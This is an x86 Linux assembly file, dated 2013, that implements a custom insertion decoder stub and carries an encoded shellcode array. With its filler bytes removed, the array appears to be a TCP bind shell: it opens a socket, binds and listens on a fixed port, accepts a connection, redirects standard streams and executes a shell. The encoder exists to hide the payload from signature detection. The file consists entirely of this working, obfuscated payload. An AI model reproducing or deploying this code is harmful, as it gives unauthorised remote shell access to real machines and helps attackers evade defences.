; Filename : decoder_shellcode.asm
; Author : M.Acosta <amcx62[_at_]gmail[_dot_]com>
; Date : 2013 August
; Location : Lima(Peru)
; Desc : Custom Insertion Decoder 
; Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)

global _start

section .text
_start:
	jmp short call_shellcode
stub:	
	pop esi 		    ;Get address of encoded shellcode
	lea edi,[esi]		;Get address of encoded shellcode
	xor ecx,ecx
	inc esi			    ;Correct position byte in the shellcode
	inc edi			    ;Next position byte in the shellcode
	mov ecx,slen
	
decode:
 	xor eax,eax
	xor ebx,ebx

	mov al,byte[edi] 	;Get distance of the next valid byte
	add eax,edi		    ;Get address of the next valid byte

	mov bl,byte[eax]	;Get valid byte  
	mov byte [esi],bl	;Move valid byte to correct position

	mov edi,eax
	inc edi
	inc esi

	loop decode

	jmp short EncodedShellcode ; after decoded jump to shellcode

call_shellcode:
 	call stub
	EncodedShellcode: db 0x31,0x02,0xCC,0xdb,0x03,0xCC,0xCC,0xb3,0x02,0xCC,0x01,0x03,0xCC,0xCC,0x6a,0x03,0xCC,0xCC,0x06,0x03,0xCC,0xCC,0x6a,0x02,0xCC,0x01,0x03,0xCC,0xCC,0x6a,0x03,0xCC,0xCC,0x02,0x02,0xCC,0x31,0x02,0xCC,0xc9,0x03,0xCC,0xCC,0x89,0x03,0xCC,0xCC,0xe1,0x02,0xCC,0x31,0x02,0xCC,0xc0,0x03,0xCC,0xCC,0xb0,0x02,0xCC,0x66,0x02,0xCC,0xcd,0x03,0xCC,0xCC,0x80,0x02,0xCC,0x89,0x03,0xCC,0xCC,0xc6,0x03,0xCC,0xCC,0x31,0x02,0xCC,0xdb,0x02,0xCC,0xb3,0x02,0xCC,0x02,0x03,0xCC,0xCC,0x31,0x02,0xCC,0xc9,0x03,0xCC,0xCC,0x51,0x02,0xCC,0x66,0x02,0xCC,0x68,0x03,0xCC,0xCC,0x20,0x03,0xCC,0xCC,0x60,0x02,0xCC,0x66,0x03,0xCC,0xCC,0x6a,0x03,0xCC,0xCC,0x02,0x03,0xCC,0xCC,0x89,0x02,0xCC,0xe1,0x02,0xCC,0x6a,0x02,0xCC,0x10,0x02,0xCC,0x51,0x03,0xCC,0xCC,0x56,0x02,0xCC,0x89,0x03,0xCC,0xCC,0xe1,0x02,0xCC,0x31,0x02,0xCC,0xc0,0x03,0xCC,0xCC,0xb0,0x03,0xCC,0xCC,0x66,0x03,0xCC,0xCC,0xcd,0x03,0xCC,0xCC,0x80,0x02,0xCC,0x31,0x02,0xCC,0xdb,0x02,0xCC,0xb3,0x03,0xCC,0xCC,0x04,0x03,0xCC,0xCC,0x6a,0x02,0xCC,0x01,0x02,0xCC,0x56,0x02,0xCC,0x89,0x02,0xCC,0xe1,0x03,0xCC,0xCC,0x31,0x03,0xCC,0xCC,0xc0,0x03,0xCC,0xCC,0xb0,0x02,0xCC,0x66,0x03,0xCC,0xCC,0xcd,0x03,0xCC,0xCC,0x80,0x02,0xCC,0x31,0x03,0xCC,0xCC,0xdb,0x03,0xCC,0xCC,0xb3,0x02,0xCC,0x05,0x02,0xCC,0x31,0x02,0xCC,0xc9,0x02,0xCC,0x51,0x03,0xCC,0xCC,0x51,0x02,0xCC,0x56,0x03,0xCC,0xCC,0x89,0x03,0xCC,0xCC,0xe1,0x03,0xCC,0xCC,0x31,0x03,0xCC,0xCC,0xc0,0x02,0xCC,0xb0,0x02,0xCC,0x66,0x02,0xCC,0xcd,0x02,0xCC,0x80,0x03,0xCC,0xCC,0x93,0x03,0xCC,0xCC,0x31,0x03,0xCC,0xCC,0xc9,0x03,0xCC,0xCC,0xb1,0x03,0xCC,0xCC,0x02,0x03,0xCC,0xCC,0xb0,0x02,0xCC,0x3f,0x02,0xCC,0xcd,0x03,0xCC,0xCC,0x80,0x02,0xCC,0xfe,0x03,0xCC,0xCC,0xc9,0x02,0xCC,0x79,0x03,0xCC,0xCC,0xf8,0x03,0xCC,0xCC,0x31,0x03,0xCC,0xCC,0xc0,0x03,0xCC,0xCC,0x50,0x03,0xCC,0xCC,0x68,0x02,0xCC,0x62,0x02,0xCC,0x61,0x03,0xCC,0xCC,0x73,0x02,0xCC,0x68,0x03,0xCC,0xCC,0x68,0x02,0xCC,0x62,0x02,0xCC,0x69,0x02,0xCC,0x6e,0x02,0xCC,0x2f,0x02,0xCC,0x68,0x02,0xCC,0x2f,0x02,0xCC,0x2f,0x02,0xCC,0x2f,0x02,0xCC,0x2f,0x02,0xCC,0x89,0x03,0xCC,0xCC,0xe3,0x02,0xCC,0x50,0x02,0xCC,0x89,0x02,0xCC,0xe2,0x02,0xCC,0x53,0x03,0xCC,0xCC,0x89,0x03,0xCC,0xCC,0xe1,0x03,0xCC,0xCC,0xb0,0x02,0xCC,0x0b,0x03,0xCC,0xCC,0xcd,0x02,0xCC,0x80 

	slen equ $-EncodedShellcode
